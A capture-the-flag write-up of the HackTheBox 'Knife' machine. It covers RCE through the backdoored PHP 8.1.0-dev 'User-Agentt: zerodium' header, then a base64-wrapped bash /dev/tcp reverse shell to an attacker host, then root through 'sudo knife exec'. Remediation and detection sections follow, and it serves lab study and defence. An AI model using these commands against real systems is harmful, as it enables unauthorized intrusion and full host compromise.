---
layout: default
title: "HackTheBox - Knife"
---

# HackTheBox - Knife

**OS:** Linux (Ubuntu 20.04.2 LTS)

Knife is a Linux machine whose only real attack surface is an Apache site running
`PHP/8.1.0-dev`, a development build that was briefly backdoored at the source level
in March 2021 when two malicious commits were pushed to the official PHP Git
repository. The backdoor grants unauthenticated remote code execution to anyone who
sends a crafted `User-Agentt` header, landing a shell as the `james` user with no
exploitation effort beyond an HTTP request. Privilege escalation is a textbook
GTFOBins case: `james` may run the Chef `knife` utility as root with no password, and
`knife exec` runs arbitrary Ruby, so a single command returns a root shell.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (knife) |
| Initial Access | Backdoored `PHP/8.1.0-dev` `User-Agentt` header RCE |
| Privilege Escalation | `sudo knife exec` (GTFOBins) |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP connect scan found only two open ports, with a service/version sweep on
the top ports for detail. A full `-p-` scan was left running in the background for the
record; it confirmed nothing beyond 22 and 80.

```
v0idravl@v0idf0rge:~$ nmap -sCV --top-ports 100 --min-rate 5000 <target-ip>
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for <target-ip>
Host is up (0.12s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.2p1 (Ubuntu Focal) |
| 80 | TCP | HTTP | Apache 2.4.41, "Emergent Medical Idea" site |

With SSH offering no unauthenticated foothold, port 80 is the entire surface.

### The Detail That Solves the Box

The HTML on port 80 is a static "Emergent Medical Idea" landing page with no obvious
parameters, forms, or links. The whole vulnerability is in the response **headers**,
so the first move on any PHP target is to look at what the server advertises:

```
v0idravl@v0idf0rge:~$ curl -s -I http://<target-ip>/
HTTP/1.1 200 OK
Date: Wed, 24 Jun 2026 07:58:31 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

`X-Powered-By: PHP/8.1.0-dev` is the entire box. `8.1.0-dev` is not a normal release,
it is the in-development build that was compromised when an attacker pushed two
commits ("fix typo" / "Revert") to the official `php-src` repository on 28 March 2021,
adding a backdoor before the change was caught and reverted. Any host actually serving
this build is running the backdoored code.

> **Why this works:** version banners are not just inventory noise. A development or
> pre-release build of an interpreter on a public server is a red flag in its own
> right, and `PHP/8.1.0-dev` specifically maps to a known supply-chain backdoor with a
> public trigger. Reading `X-Powered-By` before touching anything else turned a
> static brochure site into unauthenticated RCE.

---

## Initial Access

### The PHP 8.1.0-dev Backdoor

The injected code checks incoming requests for a header named `User-Agentt` (note the
doubled `t`). If its value begins with the string `zerodium`, the remainder is passed
to PHP's `eval()`. So any PHP expression after `zerodium` runs on the server. A quick
proof with `system()` confirms code execution and shows which user the web stack runs
as:

```
v0idravl@v0idf0rge:~$ curl -s http://<target-ip>/ \
    -H 'User-Agentt: zerodiumvar_dump(system("id; hostname"));'
uid=1000(james) gid=1000(james) groups=1000(james)
knife
string(5) "knife"
<!DOCTYPE html>
...
```

The `id` output (`james`, uid 1000) is prepended to the normal page body, so the
backdoor executes our command and returns its stdout inline. No authentication, no
brute force, no uploaded payload.

> **Why this works:** the backdoor is `eval()` of attacker-controlled input reachable
> by an unauthenticated header. `system("id")` runs because `system()` is a normal PHP
> function and the request body is treated as trusted PHP source. The doubled-`t`
> header name (`User-Agentt`) and the `zerodium` prefix are the literal magic values
> the malicious commit looked for.

> **Gotcha worth recording:** rather than run a downloaded PoC (e.g. searchsploit's
> `php/webapps/49933.py`) on the attack box unread, the trigger is a one-line `curl`,
> so there is no reason to execute a foreign script at all. The exploit is small
> enough to issue by hand, which is both faster and safer.

### Upgrading to a Reverse Shell

A reverse shell makes interactive work and privilege escalation comfortable. Start a
listener on the attack box:

```
v0idravl@v0idf0rge:~$ nc -lvnp 9001
listening on [any] 9001 ...
```

Then trigger an outbound `bash` from the target through the same backdoor. To avoid
shell-quoting issues inside the header, the payload is base64-encoded and decoded on
the target:

```
v0idravl@v0idf0rge:~$ PAYLOAD=$(echo -n 'bash -i >& /dev/tcp/<lhost>/9001 0>&1' | base64 -w0)
v0idravl@v0idf0rge:~$ curl -s http://<target-ip>/ \
    -H "User-Agentt: zerodiumsystem(\"echo $PAYLOAD | base64 -d | bash\");"
```

The listener catches the connection as `james`:

```
connect to [<lhost>] from (UNKNOWN) [<target-ip>] 56038
bash: cannot set terminal process group (994): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

> **Why this works:** `bash -i >& /dev/tcp/<host>/<port> 0>&1` uses bash's built-in
> `/dev/tcp` pseudo-device to open a TCP socket and wire the interactive shell's
> stdin/stdout/stderr to it. base64-wrapping the payload keeps quotes and redirection
> characters from being mangled as they pass through the `curl` header and the
> server-side `eval()`.

### User Flag

```
james@knife:/$ cat /home/james/user.txt
<user-flag-redacted>
```

---

## Privilege Escalation

### sudo knife exec

The first local check on any Linux foothold is `sudo -l`:

```
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

`james` can run `/usr/bin/knife` as root with no password. `knife` is the command-line
client for **Chef**, the infrastructure-automation framework (here, Chef Infra Client
16.10.8). It is exactly the kind of "interpreter-capable" binary GTFOBins warns about:
the `knife exec` subcommand evaluates arbitrary Ruby, and Ruby can shell out. A single
command therefore runs as root:

```
james@knife:/$ sudo /usr/bin/knife exec -E 'system("id; cat /root/root.txt")'
uid=0(root) gid=0(root) groups=0(root)
<root-flag-redacted>
```

For an interactive root shell instead of a one-off command, the same primitive spawns
a shell:

```
james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
root@knife:/#
```

> **Why this works:** `sudo` runs `knife` as root, and `knife exec -E <code>` hands
> `<code>` straight to a Ruby interpreter running in that root context. Ruby's
> `system()`/`exec()` then create a process (or replace the current one) with the
> caller's privileges, which are root. Any binary that can be coerced into running
> arbitrary code or spawning a shell, granted unrestricted via `sudo`, is equivalent
> to handing out a root shell.

---

## Root Cause

Two independent defects chain into full compromise:

1. **A backdoored, pre-release interpreter exposed to the internet.** Apache served
   `PHP/8.1.0-dev`, a build containing a supply-chain backdoor (the March 2021
   `php-src` commit compromise) that turns an HTTP header into `eval()`. A development
   build of a language runtime should never reach a production-facing host, and this
   particular build is a known-malicious artifact.

2. **Over-broad `sudo` rights to an interpreter.** `james` was granted passwordless
   `sudo` on `/usr/bin/knife`, a binary that can execute arbitrary Ruby. This violates
   least privilege: the grant is effectively "run anything as root."

Either defect alone is serious; together they are unauthenticated-RCE-to-root. Remove
the backdoored runtime and there is no foothold; remove the `knife` sudo grant and the
foothold cannot escalate.

## Impact

An unauthenticated attacker on the network gains code execution as `james` from a
single HTTP request, then trivially escalates to `root`. That is total compromise of
the host: full read/write of all data, credential harvesting, persistence, and a
pivot point into anything the box can reach. Because the initial access requires no
credentials and no user interaction, the exposure is at the maximum severity for a
network-reachable service.

## Remediation

Recommendations are ordered by priority. The first two break the demonstrated path
outright; the rest are hardening.

**1. Replace the backdoored PHP build immediately (highest priority).**
Remove `PHP/8.1.0-dev` and install a current, signed stable release from the
distribution's package repository (e.g. the Ubuntu/`ppa:ondrej/php` packages). Treat
the host as compromised: rebuild from a known-good image rather than patching in
place, since RCE has been publicly reachable.

**2. Remove the `knife` sudo grant / apply least privilege.**
Delete the `(root) NOPASSWD: /usr/bin/knife` rule. If `james` genuinely needs to run
Chef tasks, scope the privilege to a specific, non-interpreter wrapper that cannot
execute arbitrary code, require a password, and constrain it with `secure_path` and an
allow-list of exact arguments. Audit `sudo -l` for every account and remove any grant
on a binary that can spawn a shell or evaluate code (`knife`, `ruby`, `perl`, `python`,
`vim`, `find`, etc.).

**3. Suppress version disclosure.**
Set `expose_php = Off` in `php.ini` and `ServerTokens Prod` / `ServerSignature Off`
in Apache so the stack stops advertising exact build strings in `X-Powered-By` and
`Server`. This is defence in depth, not a fix, the backdoor would still be present,
but it removes the free fingerprint.

**4. Restrict and monitor outbound egress.**
The reverse shell relied on the target dialling back out to the attacker on an
arbitrary port. Egress filtering that allows only required outbound destinations
would break the `/dev/tcp` callback even after RCE.

### Validation

- `curl -I http://host/` no longer returns `X-Powered-By: PHP/8.1.0-dev` (and `php -v`
  on the host shows a current stable release).
- Re-issue the `User-Agentt: zerodium...` request and confirm it is treated as an
  ordinary (ignored) header with no command output in the response.
- Run `sudo -l` as `james` and confirm no entry for `/usr/bin/knife` (or any
  shell-capable binary) remains.

## Detection Opportunities

- **Backdoor trigger:** any HTTP request carrying a `User-Agentt` header (the doubled
  `t`) or a value beginning with `zerodium` is malicious by definition. A WAF/IDS rule
  on either string catches every exploitation attempt with near-zero false positives.
- **Web user spawning shells:** the `www-data`/PHP process (here running as `james`)
  executing `bash`, `nc`, `curl | bash`, or opening a `/dev/tcp` socket is a
  high-fidelity RCE signal. Monitor with auditd `execve` logging or EDR process
  lineage (Apache -> php -> bash -> bash -i).
- **Reverse-shell egress:** outbound TCP from a web server to an external host on a
  non-standard port, especially a short-lived interactive session, should alert.
- **Privilege escalation:** `sudo` invocations of `knife` (or other interpreters) by a
  service/web account in `/var/log/auth.log`, and any `knife exec` usage outside a
  sanctioned automation window.

## Lessons Learned

- **Read the headers first.** The entire box lived in one `X-Powered-By` line. On any
  web target, fingerprint the stack before hunting for parameters.
- **A version string can be the whole vulnerability.** `PHP/8.1.0-dev` is not "an old
  PHP", it is a specific known-backdoored artifact. Recognising the build is the exploit.
- **Don't run foreign PoCs you don't need.** The published `49933.py` works, but the
  trigger is one `curl` line, issuing it by hand avoided executing an unread script on
  the attack box entirely.
- **`sudo -l` is always the first escalation check,** and any interpreter-capable
  binary with unrestricted `sudo` is a root shell. GTFOBins turns that recognition into
  a one-liner.

---

## Cleanup

- The exploit was a stateless `curl` request; nothing was written to the target's disk
  for initial access (no PoC uploaded, no webshell dropped).
- The reverse shell was an in-memory `bash` process; closing the `nc` listener and the
  session ends it, leaving no artifact to remove.
- No files were created on the target and no Chef/system objects were modified
  (`knife exec` was used only to read the flag and spawn a shell). Nothing to revert.
- Local attack-box listeners (`nc -lvnp 9001`) and the background `nmap` were stopped
  after the solve.
